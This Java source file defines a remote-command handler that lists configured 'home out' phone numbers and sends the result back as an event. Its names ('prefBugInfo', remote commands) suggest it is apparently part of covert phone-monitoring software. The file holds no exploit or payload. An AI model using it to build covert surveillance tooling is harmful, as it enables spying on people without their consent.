package com.vvt.rmtcmd.pcc;

import com.vvt.global.Global;
import com.vvt.prot.command.response.PhoenixCompliantCommand;
import com.vvt.protsrv.SendEventManager;
import com.vvt.rmtcmd.resource.RmtCmdTextResource;
import com.vvt.std.Constant;

public class PCCQueryHomeOutNumb extends PCCRmtCmdSync {

	private SendEventManager eventSender = Global.getSendEventManager();
	
	// PCCRmtCommand
	public void execute(PCCRmtCmdExecutionListener observer) {
		super.observer = observer;
		doPCCHeader(PhoenixCompliantCommand.QUERY_HOMEOUT.getId());
		try {
			responseMessage.append(Constant.OK);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(RmtCmdTextResource.HOME);
			int countHomeOut = prefBugInfo.countHomeOutNumber();
			for (int i = 0; i < countHomeOut; i++) {
				responseMessage.append(Constant.CRLF);
				responseMessage.append(prefBugInfo.getHomeOutNumber(i));				
			}
			observer.cmdExecutedSuccess(this);
		} catch(Exception e) {
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(e.getMessage());
			observer.cmdExecutedError(this);
		}
		createSystemEventOut(responseMessage.toString());
		eventSender.sendEvents();
	}
}
